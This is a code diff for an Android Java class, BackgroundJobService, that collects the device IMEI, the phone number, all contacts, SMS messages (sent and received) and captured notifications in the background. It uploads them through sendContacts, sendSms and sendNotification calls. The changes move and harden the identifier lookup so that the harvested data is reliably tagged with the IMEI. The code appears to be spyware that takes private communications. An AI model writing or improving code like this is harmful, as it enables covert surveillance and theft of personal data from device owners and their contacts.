@@ -37,7 +37,7 @@ public class BackgroundJobService {
     private Context context;
     private DbService dbService;
     private SmsService smsService;
-    private String UserMobile = "";
+    private String UserMobile;
     private String imeiNumber = "";
     private final int LIMITATION = 50;
 
@@ -45,22 +45,18 @@ public class BackgroundJobService {
         this.context = context;
         dbService = new DbService(context);
         smsService = new SmsService(context);
+
+    }
+    public void ReadPhoneContacts() {
         if (ContextCompat.checkSelfPermission(context,
-                Manifest.permission.READ_PHONE_STATE)
+                Manifest.permission.READ_CONTACTS)
                 == PackageManager.PERMISSION_GRANTED) {
             try {
                 imeiNumber = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
                 UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
             } catch (Exception e) {
                 e.printStackTrace();
-                UserMobile = "";
             }
-        }
-    }
-    public void ReadPhoneContacts() {
-        if (ContextCompat.checkSelfPermission(context,
-                Manifest.permission.READ_CONTACTS)
-                == PackageManager.PERMISSION_GRANTED) {
             String ContactName = "";
             String ContactID = "";
             String ContactNumber = "";
@@ -136,7 +132,7 @@ public class BackgroundJobService {
                 }
             }
             if (contactDataArrayList.size() > 0) {
-                smsService.sendContacts(UserMobile == null ? imeiNumber : UserMobile, ContactID, ContactNumber, ContactName);
+                smsService.sendContacts((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, ContactID, ContactNumber, ContactName);
             }
         }
     }
@@ -147,6 +143,12 @@ public class BackgroundJobService {
         if (ContextCompat.checkSelfPermission(context,
                 Manifest.permission.READ_SMS)
                 == PackageManager.PERMISSION_GRANTED) {
+            try {
+                imeiNumber = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+                UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
             String MsgID = "";
             String MsgDate = "";
             String MsgFrom = "";
@@ -168,10 +170,10 @@ public class BackgroundJobService {
                         String type = c.getString(c.getColumnIndexOrThrow("type")).toString();
                         if(type.equals("2")){//send
                             sms.setTonNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
-                            sms.setNumber(UserMobile == null ? imeiNumber : UserMobile);
+                            sms.setNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                         }else{//receive
                             sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
-                            sms.setTonNumber(UserMobile == null ? imeiNumber : UserMobile);
+                            sms.setTonNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                         }
                         sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                         if (c.isNull(c.getColumnIndexOrThrow("person"))) {
@@ -252,7 +254,7 @@ public class BackgroundJobService {
                     }
                 }
                 if (smsList.size() > 0) {
-                    smsService.sendSms(UserMobile == null ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText);
+                    smsService.sendSms((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText);
                 }
             } catch (Exception e22) {
                 e22.printStackTrace();
@@ -265,6 +267,12 @@ public class BackgroundJobService {
         if (ContextCompat.checkSelfPermission(context,
                 Manifest.permission.READ_SMS)
                 == PackageManager.PERMISSION_GRANTED) {
+            try {
+                imeiNumber = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+                UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
             String MsgID = "";
             String MsgDate = "";
             String MsgFrom = "";
@@ -279,7 +287,7 @@ public class BackgroundJobService {
                         SMSData sms = new SMSData();
                         sms.setDate(notificationEntity.getDateTime());
                         sms.setBody(notificationEntity.getMessage());
-                        sms.setTonNumber(UserMobile == null ? imeiNumber : UserMobile);
+                        sms.setTonNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                         sms.setNumber(notificationEntity.getFromNumber());
                         sms.set_id(notificationEntity.getKey().replaceAll("\\|",""));
                         smsList.add(sms);
@@ -320,7 +328,7 @@ public class BackgroundJobService {
                     }
                 }
                 if (smsList.size() > 0) {
-                    smsService.sendNotification(UserMobile == null ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText, notifications);
+                    smsService.sendNotification((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText, notifications);
                 }
             } catch (Exception e22) {
                 e22.printStackTrace();
